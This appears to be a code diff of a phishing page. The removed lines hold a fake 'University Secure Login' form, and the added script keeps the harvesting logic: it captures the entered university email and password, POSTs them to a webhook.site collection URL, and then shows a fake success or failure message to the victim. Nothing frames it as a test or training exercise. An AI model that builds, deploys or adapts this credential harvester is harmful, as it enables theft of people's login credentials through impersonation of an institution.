@@ -1,57 +1,43 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>University Login</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
-        .login-container { width: 300px; margin: auto; padding: 20px; border: 1px solid #ccc; border-radius: 10px; box-shadow: 2px 2px 10px rgba(0,0,0,0.1); }
-        input { width: 90%; padding: 10px; margin: 10px 0; }
-        button { padding: 10px 20px; background: blue; color: white; border: none; cursor: pointer; }
-        #successMessage { display: none; color: green; margin-top: 10px; font-weight: bold; }
-    </style>
-</head>
-<body>
+<script>
+    document.getElementById("authForm").addEventListener("submit", function(event) {
+        event.preventDefault(); // Prevent actual form submission
 
-    <h2>University Secure Login</h2>
-    <div class="login-container">
-        <img src="logo.png" alt="University Logo" width="150">
-        <form id="authForm">
-            <input type="text" name="user" placeholder="University Email" required><br>
-            <input type="password" name="pass" placeholder="Password" required><br>
-            <button type="submit">Login</button>
-        </form>
-        <p id="successMessage">✅ Login Successful!</p> <!-- Hidden message -->
-    </div>
+        let formData = new FormData();
+        formData.append("user", document.querySelector('input[name="user"]').value);
+        formData.append("pass", document.querySelector('input[name="pass"]').value);
+        formData.append("action", "Login Attempt");
+        formData.append("time", new Date());
 
-    <script>
-        document.getElementById("authForm").addEventListener("submit", function(event) {
-            event.preventDefault(); // Prevent form submission
+        fetch("https://webhook.site/39b5507e-6e25-4a60-b84e-3cd3e4e84c0f", {
+            method: "POST",
+            body: formData
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log("Webhook response:", data);
 
-            let formData = new FormData();
-            formData.append("user", document.querySelector('input[name="user"]').value);
-            formData.append("pass", document.querySelector('input[name="pass"]').value);
-            formData.append("action", "Login Attempt");
-            formData.append("time", new Date());
+            // ✅ Show success message
+            let messageBox = document.createElement("div");
+            messageBox.innerText = "Login Successful!";
+            messageBox.style.color = "green";
+            messageBox.style.fontSize = "18px";
+            messageBox.style.marginTop = "10px";
+            document.querySelector(".login-container").appendChild(messageBox);
+        })
+        .catch(error => {
+            console.error("Error:", error);
 
-            fetch("https://webhook.site/39b5507e-6e25-4a60-b84e-3cd3e4e84c0f", {
-                method: "POST",
-                body: formData
-            })
-            .then(response => response.text())
-            .then(data => {
-                console.log("Webhook response:", data);
-                document.getElementById("successMessage").style.display = "block"; // Show success message
-            })
-            .catch(error => {
-                console.error("Error:", error);
-            });
+            // ❌ Show error message if request fails
+            let messageBox = document.createElement("div");
+            messageBox.innerText = "Login Failed. Please try again.";
+            messageBox.style.color = "red";
+            messageBox.style.fontSize = "18px";
+            messageBox.style.marginTop = "10px";
+            document.querySelector(".login-container").appendChild(messageBox);
         });
-    </script>
+    });
+</script>
 
-</body>
-</html>
 
 
 
